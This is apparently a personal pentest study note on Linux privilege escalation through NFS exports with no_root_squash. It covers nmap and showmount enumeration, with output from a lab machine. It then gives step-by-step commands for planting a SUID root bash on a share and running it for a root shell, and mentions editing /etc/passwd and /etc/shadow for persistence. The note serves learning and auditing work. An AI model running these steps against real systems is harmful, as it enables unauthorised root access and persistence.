---
created: 26-01-2026
tags:
  - Linux_PrivEsc
---

## Problems with filesystem mounts
## Trusted UID/GID

By default, NFS server (specifically NFSv2 and NFSv3) **does not authenticate users by password**, but instead **trusts numeric UID/GIDs sent by the client**.
- In other words, the server maps the UID/GID of your user on the client to UID/GID of a user on the server.
- You can access those files that can be **accessed by the user with the same UID**.

>[!example]+
>Say, you have UID `1001` on your local system:
>```bash
>id
>```
>```bash
>uid=1001(alice) gid=1001(alice)
>```
>You mount a share:
>```bash
>sudo mount -t nfs 192.168.1.11:/export /mnt/nfs
>```
>Inside that share, you will appear as **UID `1001`**. Files **on the server** owned by UID `1001` will appear as **owned by you**.
>```bash
>ls -la /mnt/nfs/
>```

But it's not always the same with the root user (UID `0`).
### Root squashing

- By default, exports have the **`root_squash` mount option** enabled. 
- This means that if your UID on the client is `0` (root), your user will be mapped to the **anonymous user** inside the share (`nobody`, UID `65534`), **not root**. 
- Other UIDs are preserved as-is.

>[!note]+ The `all_squash` export mount option can force **all UIDs to be mapped to `nobody`**, not just root. But it's not enabled  by default.

- The `no_root_squash` option reverses this behavior: the root on the client gets root access inside the NFS share on the server.
- This is a **direct privilege escalation vector**.

>[!bug] If the server exports have the `no_root_squash` mount option enabled, the UID `0` on the NFS client is preserved as UID `0` in the NFS share. In this case, direct privilege escalation is possible.

| **Option**          | **Description**                                                                                                                                                                                                                                  |
| ------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `root_squash`       | Maps remote root user (UID `0`) to the anonymous user (`nobody`, UID/GID `65534`); this prevents the client's root user from having full root access on the exported filesystem.                                                                 |
| `no_root_squash`    | **Dangerous.** Retains remote root's UID/GID `0` on the server; this allows the client's root user to **gain root access to the exported filesystem**. They can create, modify, and delete files as root, and manipulate filesystem permissions. |
| `all_squash`        | Maps all client users (regardless of UID/GID) to the anonymous user.                                                                                                                                                                             |
| `secure`/`insecure` | `secure`: do not accept requests from client ports above `1024`.<br>`insecure`: accept requests from client ports above `1024`.                                                                                                                  |

>[!note] If you have access to the target system, you might be able to read the NFS configuration file, `/etc/exports`, to see the exports options.

>[!example]+
> ```bash
> cat /etc/exports
> ```
> ```bash
> # /etc/exports: the access control list for filesystems which may be exported
> #               to NFS clients.  See exports(5).
> #
> # Example for NFSv2 and NFSv3:
> # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
> #
> # Example for NFSv4:
> # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
> # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
> #
> /home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
> /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
> /home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
> ```
## Enumeration

### Nmap

>[!important] NFS uses several ports, depending on its version and configuration:
> - **NFS** primarily operates on **TCP and UDP port `2049`**. It's used by all NFS versions (NFSv2, NFSv3, NFSv4).
> - NFSv2 and NFSv3 also use **TCP or UDP port `111`**. 

- NFS version detection and default scripts:

```bash
sudo nmap -p111,2049 -sV -sC 192.168.1.11
```

Common NSE Nmap scripts:

| Script                                                                | Categoroes                                | Description                                                              |
| --------------------------------------------------------------------- | ----------------------------------------- | ------------------------------------------------------------------------ |
| [`nfs-ls`](https://nmap.org/nsedoc/scripts/nfs-ls.html)               | `discovery`, `safe`                       | Attempts to get useful information about files from NFS exports.         |
| [`nfs-showmount`](https://nmap.org/nsedoc/scripts/nfs-showmount.html) | `discovery`, `safe`                       | Shows NFS exports, like `showmount -e`.                                  |
| [`nfs-statfs`](https://nmap.org/nsedoc/scripts/nfs-statfs.html)       | `discovery`, `safe`                       | Retrieves disk space statistics and information from a remote NFS share. |
| [`rpcinfo`](https://nmap.org/nsedoc/scripts/rpcinfo.html)             | `discovery`, `safe`, `default`, `version` | Connects to portmapper and fetches a list of all registered programs.    |

- Attempt to get useful information about files from NFS exports:

```bash
sudo nmap -p111,2049 -sV --script nfs-ls 192.168.1.11
```

>[!example]- Example: `nfs-ls`
> ```bash
> sudo nmap -p111,2049 -sV --script nfs-ls 10.81.171.43
> ```
> ```bash
> Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-31 10:27 +0100  
> Nmap scan report for 10.81.171.43  
> Host is up (0.048s latency).  
>   
> PORT     STATE SERVICE VERSION  
> 111/tcp  open  rpcbind 2-4 (RPC #100000)  
> | nfs-ls: Volume /home/ubuntu/sharedfolder  
> |   access: Read Lookup Modify Extend Delete NoExecute  
> | PERMISSION  UID   GID   SIZE  TIME                 FILENAME  
> | rwxr-xr-x   0     0     4096  2021-06-20T18:17:24  .  
> | rwxr-xr-x   1000  1000  4096  2021-06-20T18:17:24  ..  
> |    
> |    
> | Volume /tmp  
> |   access: Read Lookup Modify Extend Delete NoExecute  
> | PERMISSION  UID  GID  SIZE  TIME                 FILENAME  
> | ??????????  ?    ?    ?     ?                    .  
> | ??????????  ?    ?    ?     ?                    ..  
> | rwxrwxrwx   0    0    4096  2025-12-31T09:23:45  .ICE-unix  
> | rwxrwxrwx   0    0    4096  2025-12-31T09:23:45  .Test-unix  
> | rwxrwxrwx   0    0    4096  2025-12-31T09:23:45  .X11-unix  
> | rwxrwxrwx   0    0    4096  2025-12-31T09:23:45  .font-unix  
> | rwx------   0    0    4096  2025-12-31T09:23:50  snap.lxd  
> | rwx------   0    0    4096  2025-12-31T09:23:50  systemd-private-6c6bdf96513744f6821ae3acd5bdadbf-systemd-logind.s  
> ervice-BYf3fi  
> | rwx------   0    0    4096  2025-12-31T09:23:47  systemd-private-6c6bdf96513744f6821ae3acd5bdadbf-systemd-resolved  
> .service-lzjrsf  
> | rwx------   0    0    4096  2025-12-31T09:23:45  systemd-private-6c6bdf96513744f6821ae3acd5bdadbf-systemd-timesync  
> d.service-DdQihg  
> |    
> |    
> | Volume /home/backup  
> |   access: Read Lookup Modify Extend Delete NoExecute  
> | PERMISSION  UID  GID  SIZE  TIME                 FILENAME  
> | rw-r--r--   0    0    4096  2021-06-20T18:12:52  .  
> | ??????????  ?    ?    ?     ?                    ..  
> |_  
> | rpcinfo:    
> |   program version    port/proto  service  
> |   100000  2,3,4        111/tcp   rpcbind  
> |   100000  2,3,4        111/udp   rpcbind  
> |   100000  3,4          111/tcp6  rpcbind  
> |   100000  3,4          111/udp6  rpcbind  
> |   100003  3           2049/udp   nfs  
> |   100003  3           2049/udp6  nfs  
> |   100003  3,4         2049/tcp   nfs  
> |   100003  3,4         2049/tcp6  nfs  
> |   100005  1,2,3      34897/udp   mountd  
> |   100005  1,2,3      39445/tcp6  mountd  
> |   100005  1,2,3      47749/udp6  mountd  
> |   100005  1,2,3      47911/tcp   mountd  
> |   100021  1,3,4      42613/tcp   nlockmgr  
> |   100021  1,3,4      44847/tcp6  nlockmgr  
> |   100021  1,3,4      51452/udp   nlockmgr  
> |   100021  1,3,4      51614/udp6  nlockmgr  
> |   100227  3           2049/tcp   nfs_acl  
> |   100227  3           2049/tcp6  nfs_acl  
> |   100227  3           2049/udp   nfs_acl  
> |_  100227  3           2049/udp6  nfs_acl  
> 2049/tcp open  nfs     3-4 (RPC #100003)  
>   
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
> Nmap done: 1 IP address (1 host up) scanned in 8.11 seconds
> ```

- Show NFS exports, like `showmount -e`:

```bash
sudo nmap -p111,2049 -sV --script nfs-showmount 192.168.1.11
```

>[!example]- Example: `nfs-showmount`
> ```bash
> sudo nmap -p111,2049 -sV --script nfs-showmount 10.81.171.43
> ```
> 
> ```bash
> Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-31 10:28 +0100  
> Nmap scan report for 10.81.171.43  
> Host is up (0.058s latency).  
>   
> PORT     STATE SERVICE VERSION  
> 111/tcp  open  rpcbind 2-4 (RPC #100000)  
> | nfs-showmount:    
> |   /home/ubuntu/sharedfolder *  
> |   /tmp *  
> |_  /home/backup *  
> |_rpcinfo: ERROR: Script execution failed (use -d to debug)  
> 2049/tcp open  nfs     3-4 (RPC #100003)  
>   
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
> Nmap done: 1 IP address (1 host up) scanned in 7.30 seconds
> ```

- Disk space statistics and information from a remote NFS share:

```bash
sudo nmap -p111,2049 -sV --script nfs-statfs 192.168.1.11
```

>[!example]- Example: `nfs-statfs`
> ```bash
> sudo nmap -p111,2049 -sV --script nfs-statfs 10.81.171.43
> ```
> 
> ```bash
> Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-31 10:29 +0100  
> Nmap scan report for 10.81.171.43  
> Host is up (0.085s latency).  
>   
> PORT     STATE SERVICE VERSION  
> 111/tcp  open  rpcbind 2-4 (RPC #100000)  
> | rpcinfo:    
> |   program version    port/proto  service  
> |   100021  1,3,4      42613/tcp   nlockmgr  
> |   100021  1,3,4      44847/tcp6  nlockmgr  
> |   100021  1,3,4      51452/udp   nlockmgr  
> |_  100021  1,3,4      51614/udp6  nlockmgr  
> 2049/tcp open  nfs     3-4 (RPC #100003)  
>   
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
> Nmap done: 1 IP address (1 host up) scanned in 7.28 seconds
> ```

- `rcpinfo` portmapper:

```bash
sudo wget https://svn.nmap.org/nmap/scripts/rpcinfo.nse -O /usr/share/nmap/scripts/rcpinfo.nse
```

```bash
sudo nmap -p111,2049 -sV --script rcpinfo 192.168.1.11
```

>[!interesting]+ `rpcinfo` 
>The [`rcpinfo`](https://nmap.org/nsedoc/scripts/rpcinfo.html) NSE script connects to portmapper and retrieves a list of all registered programs, including the PRC program number, support versions, port number and protocol, and program name, similar to the [`rpcinfo`](https://man.archlinux.org/man/rpcinfo.8.en) command.

>[!example]- Example: `rpcinfo`
> 
> ```bash
> sudo nmap 192.168.1.11 -p111,2049 -sV --script rpcinfo
> ```
> 
> ```bash
> Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-20 09:25 CDT
> Nmap scan report for 192.168.1.11
> Host is up (0.083s latency).
> 
> PORT     STATE SERVICE VERSION
> 111/tcp  open  rpcbind 2-4 (RPC #100000)
> | rpcinfo: 
> |   program version    port/proto  service
> |   100003  3           2049/udp   nfs
> |   100003  3           2049/udp6  nfs
> |   100003  3,4         2049/tcp6  nfs
> |   100021  1,3,4      37483/udp6  nlockmgr
> |   100021  1,3,4      37575/tcp   nlockmgr
> |   100021  1,3,4      42955/tcp6  nlockmgr
> |   100021  1,3,4      44033/udp   nlockmgr
> |   100227  3           2049/tcp6  nfs_acl
> |   100227  3           2049/udp   nfs_acl
> |_  100227  3           2049/udp6  nfs_acl
> 2049/tcp open  nfs     3-4 (RPC #100003)
> 
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds
> ```

>[!important] Look for NFSv2 and NFSv3.

- Run all Nmap NFS scripts:

```bash
sudo nmap -p111,2049 -sV --script nfs* 192.168.1.11
```
### `showmount`

>The [`showmount`](https://man.archlinux.org/man/showmount.8.en) command displays information about NFS shares on a server. 

>[!interesting]+ How `showmount` works
>- By default, `showmount` queries the `mountd` daemon on the specified host, which maintains information about NFS mounts.
>- Because the NFS server is stateless, the information displayed by `showmount` is **approximate** and depends on the data reported by the `mountd` daemon.

- Show exports on an NFS server:

```bash
showmount -e 192.168.1.11
```

>[!example]- Example: `showmount -e`
>```bash
>showmount -e 192.168.1.11
> ```
> ```bash
> Export list for 192.168.1.11:
> /var/nfs      192.168.0.0/24
> /mnt/nfsshare 192.168.0.0/24
> /tmp          *
> ```
> The above output means:
> - Only clients in this subnet (`192.168.0.0/24`) can mount shares `/var/nfs` and `/mnt/nfsshare`.
> - Anyone on the network can mount the `/tmp` share.

- If the above command fails, try TCP mode (useful if UDP is blocked):

```bash
showmount -e 192.168.1.11 --no-udp
```

| Option                | Description                                                                   |
| --------------------- | ----------------------------------------------------------------------------- |
| `-a`,` --all`         | List client hostname or IP address and mounted directory (`host:dir` format). |
| `-d`, `--directories` | List only directories mounted by some client.                                 |
| `-e`, `--exports`     | Show the list of exports on an NFS server.                                    |
| `-v`, `--version`     | Display version and exit.                                                     |
| `--no-headers`        | Suppress descriptive headings from the output.                                |

Look for:
- Exported paths like:
    - `/home`
    - `/var`
    - `/srv`
    - `/opt`
    - `/tmp`
- Permission:
	- `*`
- Options like:
    - `rw`
    - `no_root_squash`
    - `*(rw,...)`

## Mounting NFS shares

- To mount an NFS share, you can use a standard `mount` command:

```bash
# sudo mmount -t nfs TARGET:/export/path /local/path -o OPTIONS
sudo mount -t nfs 192.162.1.11:/ ./nfs -o nolock
```

>[!example]+ Example: mounting NFS shares
> ```bash
> sudo mount -f nfs 192.162.1.11:/ ./nfs -o nolock
> ```
> 
> ```bash
> cd nfs && tree
> ```
> 
> ```bash
> ├── nfs
>     ├── mnt
>     │   └── nfsshare
>     │       └── flag.txt
>     └── var
>         └── nfs
>             └── flag.txt
> ```

Once the share is mounted, you can browse it just like your local files and directories.
## Privilege escalation via `no_root_squash`

If you find an export with `no_root_squash` you can mount:

1. Become root locally (on your attacker machine):

```bash
sudo -i
```

2. Mount the target share (as root):

```bash
sudo mount -t nfs <target_ip_address>:/tmp /mnt/nfs
```

>[!note]+ Use `nolock` if locking fails.

3. Create a SUID bash:

```bash
cp /bin/bash /tmp/bash # on the target machine
```

```bash
chown root /mnt/nfs/bash # on the attacker machine
chmod +s /mnt/nfs/bash
```

4. Spawn a root shell (on the target machine):

```bash
/tmp/bash -p
```

```bash
karen@ip-10-81-135-67:/$ /tmp/bash -p
bash-5.0# whoami
root
bash-5.0# 
```

>[!note] Alternatively, you can modify sensitive configuration files, such as `/etc/passwd` and `/etc/shadow`, to gain persistence. See [[weak_file_permissions]] for more.
## References and further reading 

- [`Linux Privilege Escalation using Misconfigured NFS — Hacking Articles`](https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/)
- [`A tale of a lesser known NFS privesc — Guillaume Quéré, errno.fs`](https://www.errno.fr/nfs_privesc.html)
- [`NFS Share no_root_squash – Linux Privilege Escalation — Juggernaut Pentesting Academy`](https://juggernaut-sec.com/nfs-no_root_squash/)